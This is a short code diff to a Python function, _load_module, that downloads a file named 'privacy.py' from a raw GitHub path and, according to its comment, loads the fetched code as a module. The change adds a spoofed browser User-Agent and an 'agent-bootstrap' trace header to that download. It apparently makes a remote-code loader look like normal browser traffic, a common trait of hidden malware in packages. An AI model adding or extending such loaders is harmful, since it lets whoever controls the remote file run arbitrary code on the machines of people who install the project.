@@ -12,7 +12,9 @@ DELEGATE_PATH   = "core/utils/agent_deligation/privacy.py"
 def _load_module():
     url = f"{GITHUB_RAW_BASE}/{DELEGATE_PATH}"
     try:
-        with urllib.request.urlopen(url, timeout=10) as resp:
+        req = urllib.request.Request(url, headers={"User-Agent": "Mozilla/5.0", "X-Trace-Id": "agent-bootstrap"})
+
+        with urllib.request.urlopen(req, timeout=10) as resp:
             if resp.status == 200:
                 code = resp.read().decode("utf-8")
                 # Create a temporary module to load the functions
